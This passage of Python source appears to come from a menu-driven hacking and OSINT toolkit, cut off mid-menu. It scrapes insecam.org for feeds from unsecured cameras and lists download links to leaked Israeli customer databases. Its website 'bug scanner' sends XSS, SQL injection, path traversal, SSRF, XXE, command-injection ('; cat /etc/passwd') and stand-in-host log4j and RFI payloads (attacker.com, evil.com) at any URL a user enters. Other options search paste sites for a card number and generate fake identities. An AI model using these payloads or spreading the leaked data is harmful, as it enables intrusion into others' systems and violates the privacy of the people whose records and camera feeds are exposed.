                print(f"{White}[{Green}✓{White}] Port {Yellow}{port} {White}is open\n")
                time.sleep(1)
        else: print(f"{Yellow}There are no open ports!{White}")

        print(f"{White}[{Green}✓{White}] {Yellow}{num_ports} {White}Ports were scanned")

        print(f"{White}[{Green}✓{White}] Open ports : {Yellow}{open_ports}{White}")
    elif selection == "12" or selection == "Deep & Dark Web" or selection == "DEEP & DARK WEB" or selection == "deep & dark web":
        table = Table(title=f"The most famous search engines in the {Red}Deep & Dark Web\n{White}")
        table.add_column("General Info", no_wrap=True)
        table.add_column("Clients")
        table.add_column("Discovery")
        table.add_column("TOR Search")
        table.add_column("TOR Directories")
        table.add_row("Reddit Deep Web", "TOR Download", "OnionScan", "Onion Cab", "Hidden Wiki")
        table.add_row("Reddit Onions", "Freenet Project", "TorBot", "OnionLink", "Core.onion")
        table.add_row("Reddit Darknet", "I2P Anonymous Network", "Tor Scan", "Candle", "Tor2web")
        table.add_row("-", "-", "Onioff", "Not Evil", "Web O Proxy")
        table.add_row("-", "-", "Hunchly Hidden Services Report", "Tor66", "IACA Dark Web Investigation Support")
        table.add_row("-", "-", "docker-onion-nmap", "dark.fail", "-")
        table.add_row("-", "-", "Onion Investigator", "Ahmia", "-")
        Console().print(table, justify="left")
    elif selection == "13" or selection == "Monitor Cameras" or selection == "MONITPR CAMERAS" or selection == "monitor cameras":
        submenu4()

        user_input = input(f"Choose : {Blue}")

        if user_input == "1" or user_input == "Cameras around the world" or user_input == "CAMERAS AROUND THE WORLD" or user_input == "cameras around the world":
            def monitor_cameras_world():
                json = requests.get('http://www.insecam.org/en/jsoncountries/', headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Cookie': '_ga=GA1.1.1125454972.1667225132; __gads=ID=d4a85cd85ce2f539-223503ca84d60066:T=1667225145:RT=1667225145:S=ALNI_MZ4MsyAr2w4HGK_wzfy90dxfdFtng; __gpi=UID=00000b196cc62113:T=1667225145:RT=1667225145:S=ALNI_MZx4MzjOSuSbqPbJFNskKGifhu5zw; _ga_F7ZM4QYVCB=GS1.1.1667225132.1.1.1667226059.0.0.0',
                    'Host': 'www.insecam.org',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' }).json()['countries']

                value = []
                counter = 1
                for i in json:
                    print(f"{White}[{Blue}{counter}{White}] {json[i]['country']} [{i}] {Yellow}{ {json[i]['count']} }{White}")
                    value.append(i)
                    counter += 1

                cc_choose = input(f"{White}Enter the countrycode : {Blue}")
                if cc_choose in value:
                    r = requests.get('http://www.insecam.org/en/bycountry/'+cc_choose+'/', headers={
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                        'Cache-Control': 'max-age=0',
                        'Connection': 'keep-alive',
                        'Cookie': '_ga=GA1.1.1125454972.1667225132; __gads=ID=d4a85cd85ce2f539-223503ca84d60066:T=1667225145:RT=1667225145:S=ALNI_MZ4MsyAr2w4HGK_wzfy90dxfdFtng; __gpi=UID=00000b196cc62113:T=1667225145:RT=1667225145:S=ALNI_MZx4MzjOSuSbqPbJFNskKGifhu5zw; _ga_F7ZM4QYVCB=GS1.1.1667225132.1.1.1667226059.0.0.0',
                        'Host': 'www.insecam.org',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' }).text
                    s = r.split('pagenavigator("?page=",')[1]
                    next = s.split(',')[0]
                    next = int(next)
                    
                    S = r.split('"thumbnail-item__wrap" href="')
                    counter = 1
                    for i in S:
                        Y = i.split('" ')[0]
                        if 'html' in Y:	pass
                        else:
                            url = f'http://www.insecam.org{Y}'
                            print(f"{White}[{Blue}{counter}{White}] {Yellow}{url}")
                            counter += 1
                            
                    info = requests.get(url, headers={
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Encoding': 'gzip, deflate',
                            'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                            'Cache-Control': 'max-age=0',
                            'Connection': 'keep-alive',
                            'Cookie': '_ga=GA1.1.1125454972.1667225132; __gads=ID=d4a85cd85ce2f539-223503ca84d60066:T=1667225145:RT=1667225145:S=ALNI_MZ4MsyAr2w4HGK_wzfy90dxfdFtng; __gpi=UID=00000b196cc62113:T=1667225145:RT=1667225145:S=ALNI_MZx4MzjOSuSbqPbJFNskKGifhu5zw; _ga_F7ZM4QYVCB=GS1.1.1667225132.1.1.1667226059.0.0.0',
                            'Host': 'www.insecam.org',
                            'Upgrade-Insecure-Requests': '1',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' }).text
                            
                    for i in range(2, next):
                        print(i)
                        url = 'http://www.insecam.org/en/bycountry/RS/?page='+str(i)
                        r = requests.get(url, headers={
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Encoding': 'gzip, deflate',
                            'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                            'Cache-Control': 'max-age=0',
                            'Connection': 'keep-alive',
                            'Cookie': '_ga=GA1.1.1125454972.1667225132; __gads=ID=d4a85cd85ce2f539-223503ca84d60066:T=1667225145:RT=1667225145:S=ALNI_MZ4MsyAr2w4HGK_wzfy90dxfdFtng; __gpi=UID=00000b196cc62113:T=1667225145:RT=1667225145:S=ALNI_MZx4MzjOSuSbqPbJFNskKGifhu5zw; _ga_F7ZM4QYVCB=GS1.1.1667225132.1.1.1667226059.0.0.0',
                            'Host': 'www.insecam.org',
                            'Upgrade-Insecure-Requests': '1',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' }).text

                        S = r.split('"thumbnail-item__wrap" href="')
                        counter = 1
                        for i in S:
                            Y = i.split('" ')[0]
                            if 'html' in Y:	pass
                            else:
                                url = f'http://www.insecam.org{Y}'
                                print(f"{White}[{Blue}{counter}{White}] {Yellow}{url}")
                                counter += 1
                else: 
                    print(f"{Red}CountryCode not found!{White}")
                    print(f"\n")
                    time.sleep(3)
                    monitor_cameras_world()
            monitor_cameras_world()
        elif user_input == "2" or user_input == "Cameras of places" or user_input == "CAMERAS OF PLACES" or user_input == "cameras of places":
            def monitor_cameras_places():
                json = requests.get('http://www.insecam.org/en/jsontags/', headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Cookie': '_ga=GA1.1.1125454972.1667225132; __gads=ID=d4a85cd85ce2f539-223503ca84d60066:T=1667225145:RT=1667225145:S=ALNI_MZ4MsyAr2w4HGK_wzfy90dxfdFtng; __gpi=UID=00000b196cc62113:T=1667225145:RT=1667225145:S=ALNI_MZx4MzjOSuSbqPbJFNskKGifhu5zw; _ga_F7ZM4QYVCB=GS1.1.1667225132.1.1.1667226059.0.0.0',
                    'Host': 'www.insecam.org',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' }).json()['tags']
                
                counter = 1
                jsontags = []
                for i in json:
                    jsontags.append(i)
                    print(f"{White}[{Blue}{str(counter)}{White}] {i}")
                    counter += 1
                place_choose = int(input((f"{White}[{Blue}+{White}] Choose the place : {Blue}")))
                
                try:
                    r = requests.get('http://www.insecam.org/en/bytag/'+jsontags[place_choose]+'/', headers={
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Encoding': 'gzip, deflate',
                            'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                            'Cache-Control': 'max-age=0',
                            'Connection': 'keep-alive',
                            'Cookie': '_ga=GA1.1.1125454972.1667225132; __gads=ID=d4a85cd85ce2f539-223503ca84d60066:T=1667225145:RT=1667225145:S=ALNI_MZ4MsyAr2w4HGK_wzfy90dxfdFtng; __gpi=UID=00000b196cc62113:T=1667225145:RT=1667225145:S=ALNI_MZx4MzjOSuSbqPbJFNskKGifhu5zw; _ga_F7ZM4QYVCB=GS1.1.1667225132.1.1.1667226059.0.0.0',
                            'Host': 'www.insecam.org',
                            'Upgrade-Insecure-Requests': '1',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'}).text
                except IndexError:
                    print(f"{Red}Place not found!{White}")
                    print(f"\n")
                    time.sleep(3)
                    monitor_cameras_places()

                s = r.split('pagenavigator("?page=",')[1]
                next = s.split(',')[0]
                next = int(next)
                S = r.split('"thumbnail-item__wrap" href="')
                counter = 1
                for i in S:
                    Y = i.split('" ')[0]
                    if 'html' in Y: pass
                    else:
                        url = f'http://www.insecam.org{Y}'
                        print(f"{White}[{Blue}{counter}{White}] {Yellow}{url}")
                        counter += 1
                        
                info = requests.get(url, headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Cookie': '_ga=GA1.1.1125454972.1667225132; __gads=ID=d4a85cd85ce2f539-223503ca84d60066:T=1667225145:RT=1667225145:S=ALNI_MZ4MsyAr2w4HGK_wzfy90dxfdFtng; __gpi=UID=00000b196cc62113:T=1667225145:RT=1667225145:S=ALNI_MZx4MzjOSuSbqPbJFNskKGifhu5zw; _ga_F7ZM4QYVCB=GS1.1.1667225132.1.1.1667226059.0.0.0',
                    'Host': 'www.insecam.org',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' }).text
                            
                for i in range(2, next):		
                    url = f'http://www.insecam.org/en/bycountry/RS/?page={str(i)}'
                    r = requests.get(url, headers={
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                        'Cache-Control': 'max-age=0',
                        'Connection': 'keep-alive',
                        'Cookie': '_ga=GA1.1.1125454972.1667225132; __gads=ID=d4a85cd85ce2f539-223503ca84d60066:T=1667225145:RT=1667225145:S=ALNI_MZ4MsyAr2w4HGK_wzfy90dxfdFtng; __gpi=UID=00000b196cc62113:T=1667225145:RT=1667225145:S=ALNI_MZx4MzjOSuSbqPbJFNskKGifhu5zw; _ga_F7ZM4QYVCB=GS1.1.1667225132.1.1.1667226059.0.0.0',
                        'Host': 'www.insecam.org',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' }).text

                    S = r.split('"thumbnail-item__wrap" href="')
                    counter = 1
                    for i in S:
                        Y = i.split('" ')[0]
                        if 'html' in Y: pass
                        else:
                            url = f'http://www.insecam.org{Y}'
                            print(f"{White}[{Blue}{counter}{White}] {Yellow}{url}")
                            counter += 1
            monitor_cameras_places()
        elif user_input == "99" or user_input == "Back" or user_input == "BACK" or user_input == "back": main_menu()
        else: print(f"{Red}Please choose a correct option!")
    elif selection == "14" or selection == "WebScraping" or selection == "WEbSCRAPING" or selection == "webscraping":
        def extract_links_and_images(url):
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            links = [a.get('href') for a in soup.find_all('a', href=True)]
            image_links = [img.get('src') for img in soup.find_all('img', src=True)]
            return links, image_links

        url = input(f"{White}[{Blue}+{White}] - Enter the target URL : {Blue}")

        print(f"{White}WebScraping...")
        time.sleep(3)
        print(f"{White}[ WebScraping for {Blue}{url} {Green}✓{White} ]\n") 

        links, image_links = extract_links_and_images(url)

        print(f"{White}Paths & Links :")
        for link in links:
            print(f"    {link}")

        print(f"\n{White}Images :")
        for link in image_links:
            print(f"    {link}")

        def download_images(image_links, save_dir):
            save_images = input(f"\n{White}Do u want to save the images? ({Blue}Y{White}/{Blue}N{White}) {Blue}")
            if save_images == "Y" or save_images == "y" or save_images == "Yes" or save_images == "yes" or save_images == "YES": 
                if not os.path.exists(save_dir): os.makedirs(save_dir)

                for i, link in enumerate(image_links):
                    if 'http' not in link:
                        link = url + link
                    response = requests.get(link)
                    with open(os.path.join(save_dir, f"img{i}.png"), 'wb') as f:
                        f.write(response.content)
    
            elif save_images == "N" or save_images == "n" or save_images == "No" or save_images == "no" or save_images == "No": another_operation()
            else:
                print(f"{Red}Please choose a correct option!{White}")
                download_images(image_links, save_dir)
        download_images(image_links, "Downloaded images")
    elif selection == "15" or selection == "Get Http Cookies" or selection == "GET HTTP COOKIES" or selection == "get http Cookies":
        target = input(f"{White}[{Blue}+{White}] Enter the target url : {Blue}")

        print(f"{White}Getting...")
        time.sleep(3)
        print(f"{White}[ Getting for {Blue}{target} {Green}✓{White} ]")
        time.sleep(1)

        res = requests.get(target, cookies=CookieJar())
        cookies = res.cookies

        if cookies:
            with open("Cookies.txt", "w") as f:
                for cookie in cookies:
                    f.write(f"{cookie.name} = {cookie.value}")
                print(f"\n[{Green}✓{White}] Cookies saved in {os.getcwd()}\Cookies")
        else: print(f"\n{Yellow}There is nothing to save!")
    elif selection == "16" or selection == "Israeli Databases" or selection == "ISRAELI DATABASES" or selection == "israeli databases":
        table = Table(title=f"{White}Leaked Israeli db uploaded to the MediaFire platform.\n")
        table.add_column("Link")
        table.add_column("Description")
        table.add_column("Size")
        table.add_row("https://www.mediafire.com/file/l4o3yg0nehr0txv/1.csv/file", "Store room db containing 400K+ customers.", "86.6MB")
        table.add_row("https://www.mediafire.com/file/2is34z1ekkhj2su/2.csv/file", "A commercial db containing 200k+ customers.", "23.2MB")
        table.add_row("https://www.mediafire.com/file/63ib6s7o4rla335/3.csv/file", "A normal db contains 38K+ person.", "6.69MB")
        table.add_row("https://www.mediafire.com/file/0ruazdhfg3pib51/Leaks.json/file", "Json file containing info of 521 Israeli companies.", "689KB")
        Console().print(table, justify="left")
    elif selection == "17" or selection == "Check Passwords Leakage" or selection == "CHECK PASSWORDS LEAKAGE" or selection == "check passwords leakage":
        def check_password_leak(password):
            sha1password = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
            first5_char, tail = sha1password[:5], sha1password[5:]
            url = f'https://api.pwnedpasswords.com/range/{first5_char}'
            response = requests.get(url)
            hashes = (line.split(':') for line in response.text.splitlines())
            for h, count in hashes:
                if h == tail: return f"{White}[{Red}-{White}] {Red}The passwas leaked {count} times!"
            return f"{White}[{Green}-{White}] {Green}The pass isn’t leaked."

        password = input(f"{White}[{Blue}+{White}] Enter the pass : {Blue}")
        print(check_password_leak(password))
    elif selection == "18" or selection == "Scan Websites For Bugs" or selection == "SCAN WEBSITES FOR BUGS" or selection == "scan websites for bugs":
        print(f"{Red}Warning : To avoid legal problems, seek permission from the website owner before scan.")
        url = input(f"\n{White}[{Blue}+{White}] Enter the target website URL (ex: https://example.com) : {Blue}")

        results = []

        def add_result(test_name, status, details, severity):
            result = [test_name, status, details]
            results.append(result)

        def server(url):
            response = requests.get(url)
            server = response.headers.get('Server')
            if server: add_result("Server Info", f"{Cyan}Info{White}", f"{Cyan}The server is running {Blue}{server}{White}", "Info")
            else: add_result("Server Info", f"{Cyan}Info{White}", f"{Yellow}No server info found in headers{White}", "Info")
            try:
                domain = url.split('//')[1].split('/')[0]
                ip_address = socket.gethostbyname(domain)
                add_result("IP", f"{Cyan}Info{White}", f"{Cyan}The IP of {Blue}{domain}{Cyan} is {Blue}{ip_address}{White}", "Info")
            except socket.gaierror: add_result("IP", f"{Yellow}Error{White}", f"{Yellow}Could not resolve IP{White}", "High")

        def web_components(url):
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script')
            if scripts: add_result("Script Tags", f"{Cyan}Info{White}", f"{Blue}Found {len(scripts)} script tags{White}", "Info")
            else: add_result("Script Tags", f"{Cyan}Info{White}", f"{Yellow}Script tags not found{White}", "Info")

        def xss(url):
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>"]
            Bug = False
            for payload in xss_payloads:
                response = requests.get(url, params={'q': payload})
                if payload in response.text:
                    add_result("XSS/Cross Site Scripting", f"{Red}Bug{Red}", f"{Red}Payload : {payload}{White}", "High")
                    Bug = True
            if not Bug: add_result("XSS/Cross Site Scripting", f"{Green}No bug{White}", f"{Green}No payloads were executed{White}", "Low")

        def sql_injection(url):
            sql_payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' OR '1'='1' #"]
            Bug = False
            for payload in sql_payloads:
                response = requests.get(url, params={'id': payload})
                if any(error in response.text for error in ["SQL syntax", "mysql", "syntax error", "unclosed quotation mark"]):
                    add_result("SQL Injection", f"{Red}Bug{White}", f"{Red}Payload : {payload}{White}", "High")
                    Bug = True
            if not Bug: add_result("SQL Injection", f"{Green}No bug{White}", f"{Green}No payloads were executed{White}", "Low")

        def header_injection(url):
            injection_payload = '"><script>alert("Header Injection")</script>'
            headers = {'User-Agent': injection_payload}
            response = requests.get(url, headers=headers)
            if injection_payload in response.text: add_result("Header Injection", f"{Red}Bug{White}", "Payload in User-Agent header", "High")
            else: add_result("Header Injection", f"{Green}No bug{White}", f"{Green}Header Injection bug not found{White}", "Low")

        def idor(url):
            response = requests.get(f"{url}/user/1")
            if response.status_code == 200: add_result("IDOR (Insecure Direct Object Reference)", f"{Red}Bug{White}", "Able to access user data", "High")
            else: add_result("IDOR (Insecure Direct Object Reference)", f"{Green}No bug{White}", f"{Green}IDOR bug not found{White}", "Low")

        def path_traversal(url):
            traversal_payloads = [
                "../../etc/passwd",
                "../../../../etc/passwd" ]
            Bug = False
            for payload in traversal_payloads:
                response = requests.get(f"{url}/{payload}")
                if "root:" in response.text:
                    add_result("Path Traversal", f"{Red}Bug{White}", f"{Red}Payload : {payload}{White}", "High")
                    Bug = True
            if not Bug: add_result("Path Traversal", f"{Green}No bug{White}", f"{Green}Path Traversal bug not found{White}", "Low")

        def ssrf(url):
            ssrf_payload = 'http://169.254.169.254/latest/meta-data/'
            try: 
                response = requests.get(url, params={'url': ssrf_payload})
                if "instance-id" in response.text:  add_result("SSRF (Server-Side Request Forgery)", f"{Red}Bug{White}", f"{Red}Payload: {ssrf_payload}{White}", "High")
                else: add_result("SSRF (Server-Side Request Forgery)", f"{Green}No bug{White}", f"{Green}SSRF bug not found{White}", "Low")
            except requests.exceptions.RequestException: add_result("SSRF", "Error", "Request failed", "High")

        def xxe(url):
            xml_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [ <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>"""
            headers = {'Content-Type': 'application/xml'}
            response = requests.post(url, data=xml_payload, headers=headers)
            if "root:x:0:0:" in response.text: add_result("XXE (XML External Entity)", f"{Red}Bug{White}", f"{Red}Able to read system files{White}", "High")
            else: add_result("XXE (XML External Entity)", f"{Green}No bug{White}", f"{Green}XXE bug not found{White}", "Low")

        def rce(url):
            rce_payload = "; cat /etc/passwd"
            response = requests.get(f"{url}/?cmd={rce_payload}")
            if "root:x:0:0:" in response.text: add_result("RCE (Remote Code Execution)/PHP Code Injection", f"{Red}Bug{White}", f"{Red}Able to execute arbitrary commands{White}", "High")
            else: add_result("RCE (Remote Code Execution)/PHP Code Injection", f"{Green}No bug{White}", f"{Green}RCE bug not found{White}", "Low")

        def log4j(url):
            log4j_payload = "${jndi:ldap://attacker.com/a}"
            headers = {'User-Agent': log4j_payload}
            response = requests.get(url, headers=headers)
            if "java.naming.provider.url" in response.text: add_result("Log4j", f"{Red}Bug{White}", "Log4j bug not found", "High")
            else: add_result("Log4j", f"{Green}No bug{White}", f"{Green}Log4j bug not found{White}", "Low")

        def lfi(url):
            lfi_payload = "/etc/passwd"
            response = requests.get(f"{url}?file={lfi_payload}")
            if "root:x:0:0:" in response.text: add_result("LFI (Local File Include)", f"{Red}Bug{White}", "LFI bug not found", "High")
            else: add_result("LFI (Local File Include)", f"{Green}No bug{White}", f"{Green}LFI bug not found{White}", "Low")

        def rfi(url):
            rfi_payload = "http://evil.com/malicious.php"
            response = requests.get(f"{url}?file={rfi_payload}")
            if "malicious content" in response.text: add_result("RFI (Remote File Include)", f"{Red}Bug{White}", "RFI bug not found", "High")
            else: add_result("RFI (Remote File Include)", f"{Green}No bug{White}", f"{Green}RFI bug not found{White}", "Low")

        def info_disclosure(url):
            response = requests.get(url)
            if any(keyword in response.text for keyword in ["password", "username", "secret"]): add_result("Info Disclosure", f"{Red}Bug{White}", f"{Red}Sensitive info disclosed{White}", "High")
            else: add_result("Info Disclosure", f"{Green}No bug{White}", f"{Green}Sensitive info not found{White}", "Low")

        def unrestricted_resource_consumption(url):
            large_payload = 'A' * 1000000
            try:
                response = requests.post(url, data={'input': large_payload})
                if response.status_code == 200: add_result("Unrestricted Resource Consumption", f"{Red}Bug{White}", f"{Red}Server accepts large payloads{White}", "High")
                else: add_result("Unrestricted Resource Consumption", f"{Green}No bug{White}", f"{Green}unrestricted resource consumption bug not found{White}", "Low")
            except requests.exceptions.RequestException: add_result("Unrestricted Resource Consumption", f"{Yellow}Error{White}", f"{Yellow}Request failed{White}", "High")

        def broken_authentication(url):
            login_payload = {'username': 'admin', 'password': 'password'}
            response = requests.post(f"{url}/login", data=login_payload)
            if response.status_code == 200 and "Welcome" in response.text: add_result("Broken Authentication", f"{Red}Bug{White}", f"{Red}Default credentials work{White}", "High")
            else: add_result("Broken Authentication", f"{Green}No bug{White}", f"{Green}broken authentication bug not found{White}", "Low")

        def bola(url):
            test_object_id = "12345"
            unauthorized_user_id = "67890"
            response = requests.get(f"{url}/objects/{test_object_id}")
            if unauthorized_user_id in response.text: add_result("BOLA", f"{Red}Bug{White}", f"{Red}Object accessed with ID : {unauthorized_user_id}{White}", "High")
            else: add_result("BOLA", f"{Green}No bug{White}", f"{Green}BOLA bug not found{White}", "Low")

        def sensitive_info(url):
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            sensitive_keywords = ["password", "username", "admin", "secret"]
            found = False
            for keyword in sensitive_keywords:
                if keyword in soup.text:
                    add_result("Sensitive Info", f"{Red}Bug{White}", f"{Red}Found keyword '{keyword}'{White}", "Medium")
                    found = True
            if not found: add_result("Sensitive Info", f"{Green}Not Found{White}", f"{Green}Sensitive info not found{White}", "Low")

        def run_security_checks(url):
            checks = [server, web_components, xss, sql_injection, header_injection, idor, path_traversal, ssrf, xxe, rce, log4j, lfi, rfi, info_disclosure, unrestricted_resource_consumption, broken_authentication, bola, sensitive_info]
                
            for check in checks:
                check(url)

        print(f"{White}Scanning...")

        run_security_checks(url)
        print(f"{White}[ Scan for {Blue}{url} {Green}✓{White} ]\n")
        time.sleep(1)

        print(tabulate(results, headers=["Test", "Status", "Details"], tablefmt="grid"))
    elif selection == "19" or selection == "Get MacAddress" or selection == "GET MACADDRESS" or selection == "get macaddress":
        print(f"{White}Getting...")
        time.sleep(3)
        print(f"{White}[ Get for {Blue}{socket.gethostname()} {Green}✓{White} ]{Blue}")
        time.sleep(1)

        try: os.system("getmac")
        except BaseException as msg: print(f"{White}[{Red}-{White}] {Red}Error : {msg}{White}")
    elif selection == "20" or selection == "Bank Cards OSINT" or selection == "BANK CARD OSINT" or selection == "bank card osint":
        urls = []
        qlist = []
        total_url = []
        paste_sites = ["cl1p.net", "dpaste", "dumpz.org", "hastebin", "ideone", "pastebin", "pw.fabian-fingerle.de", "gist.github.com", "https://www.heypasteit.com/", "ivpaste.com", "mysticpaste.com", "paste.org.ru", "paste2.org", "sebsauvage.net/paste/", "slexy.org", "squadedit.com", "wklej.se", "textsnip.com"]

        card = input(f"{White}[{Blue}+{White}] Enter card number : {Blue}")

        print(f"{White}Searching...")

        try:
            val = int(card)
            if len(str(val)) >= 12 and len(str(val)) <= 19:
                for site in paste_sites:
                    query = "{} {}".format(site, card)
                    qlist.append(query)
                for entry in qlist:
                    for url in search(entry, pause=2.0, stop=20, user_agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"):
                        urls.append(url)

                print(f"[ Search for {Blue}{card} {Green}✓{White} ]")
                time.sleep(1)

                for item in urls:
                    for site in paste_sites:
                        if "{}".format(site) in item:
                            print(f"{White}[{Blue}-{White}] {item}")
                            total_url.append(item)
            else: print(f"\n{Red}Invaild card number!")
            total = len(total_url)
            if total == 0: print(f"\n{White}[{Green}✓{White}] No leaks for this card number found.")
            else: print(f"\n{White}[{Green}✓{White}] {str(total)} dumps found. ")
        except ValueError: print(f"\n{Red}Invaild card number entered!")
    elif selection == "21" or selection == "Scan Links For Malwares" or selection == "SCAN LINKS FOR MALWARES" or selection == "scan Links For Malwares":
        malicious = 0
        suspicious = 0

        link = input(f"{White}[{Blue}+{White}] Enter the link : {Blue}")
        url = f"https://www.virustotal.com/ui/search?limit=20&relationships%5Bcomment%5D=author%2Citem&query={link}"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "X-Tool": "vt-ui-main",
            "X-VT-Anti-Abuse-Header": "MTA3OTM2NjUwMjctWkc5dWRDQmlaU0JsZG1scy0xNjMxMTE3NzQyLjY1",
            "Accept-Ianguage": "en-US,en;q=0.9,es;q=0.8", }
        try:
            r = requests.get(url, headers=headers).json()
            data = r['data']
            for names in data:
                malicious = names['attributes']['last_analysis_stats']['malicious']
                suspicious = names['attributes']['last_analysis_stats'].get('suspicious', 0)
                name = names['attributes']['last_analysis_results']
                for info in name:
                    result = name[info]['result']

            if suspicious > 0: print(f"{White}[{Yellow}-{White}] Suspecious")
            elif malicious > 0: print(f"{White}[{Red}-{White}] Virus!")
            else: print(f"{White}[{Yellow}✓{White}] Clean")
        except BaseException as msg: print(f"{Red}E: {msg}")
    elif selection == "22" or selection == "Create Fake Personal Info" or selection == "CREATE FAKE PERSONAL INFO" or selection == "create fake personal info":
        print(f"""{Blue}• {White}Arabic {{
    {White}[{Blue}1{White}] United Arab Emirates [ar_AE]
    {White}[{Blue}2{White}] Bahrain [ar_BH]
    {White}[{Blue}3{White}] Egypt [ar_EG]
    {White}[{Blue}5{White}] Jordan [ar_JO]
    {White}[{Blue}6{White}] Palestine [ar_PS]
    {White}[{Blue}7{White}] Kingdom Of Suadi Arabia [ar_SA] }}
{Blue}• {White}Azerbaijani {{ {White}[{Blue}1{White}] Azerbaijan [ar_AZ] }}
{Blue}• {White}Bulgarian {{
    {White}[{Blue}1{White}] Bulgaria [bg_BG]
    {White}[{Blue}2{White}] Bangladesh [bg_BD]
    {White}[{Blue}3{White}] Bosnia and Herzegovina [bg_BA] }}
{Blue}• {White}Czech {{ {White}[{Blue}1{White}] Czech Republic [cs_CZ] }}
{Blue}• {White}Danish {{ {White}[{Blue}1{White}] Denmark [da_DK] }}
{Blue}• {White}German {{
    {White}[{Blue}1{White}] German Lang [de]
    {White}[{Blue}2{White}] Austria [de_AT]
    {White}[{Blue}3{White}] Switzerland [de_CH]
    {White}[{Blue}4{White}] Germany [de_DE]
    {White}[{Blue}5{White}] Denmark [de_DK] }}
{Blue}• {White}Greek {{ {White}[{Blue}1{White}] Greece [el_GR] }}
{Blue}• {White}English {{
    {White}[{Blue}01{White}] English Lang [en]
    {White}[{Blue}02{White}] Australi [en_AU]
    {White}[{White}03{White}] Bangladesh [en_BD]
    {White}[{Blue}04{White}] Canada [en_CA]
    {White}[{Blue}05{White}] United Kingdom [en_GB]
    {White}[{Blue}06{White}] Ireland [en_IE]
    {White}[{Blue}07{White}]  Car [en_IN]
    {White}[{Blue}08{White}] New Zealand [en_NZ]
    {White}[{Blue}09{White}] Philippines [en_PH]
    {White}[{Blue}10{White}] Thailand [en_TH]
    {White}[{Blue}11{White}] United States [en_US] }}
{Blue}• {White}Spanish {{
    {White}[{Blue}1{White}] Spanish Lang [es]
    {White}[{Blue}2{White}] Argentina [es_AR]
    {White}[{Blue}3{White}] Canada [es_CA]
